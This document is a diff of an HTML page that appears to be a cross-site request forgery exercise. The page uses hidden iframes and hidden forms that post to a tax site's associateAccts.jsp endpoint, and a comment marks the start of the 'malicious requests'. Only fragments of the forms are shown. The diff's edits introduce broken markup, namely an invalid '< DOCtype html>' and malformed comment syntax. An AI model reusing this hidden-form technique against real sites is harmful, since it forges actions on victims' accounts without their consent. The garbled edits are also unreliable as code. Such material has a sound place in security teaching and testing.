@@ -1,4 +1,4 @@
-<html>
+< DOCtype html>
 <body>
  <iframe style="display: none" name="payTaxIframe1">
  </iframe>
@@ -9,7 +9,7 @@
  </iframe>
  <iframe style="display: none" name="payTaxIframe4">
  </iframe>
-<!-- Gane starts here with malicious requests -->
+<!!!-- Game starts here with malicious requests --->
  
 <form style="display: none; visibility: hidden" target="payTaxIframe1"
 action="https://www.taxpayme.com/account/associateAccts.jsp"
@@ -56,7 +56,7 @@ name="paytaxForm3">
 
 
 <!-- receiving his monthly statement a couple of weeks later. --> 
-<!-- .js files filed with scripts used in rendering the page. --> 
+<!-- .js files filled with Javascripts used in rendering the page. --> 
 <!-- cookie will receive by a legitimate login. --> 
 
               <!--   Happy hunting. -_~ -->
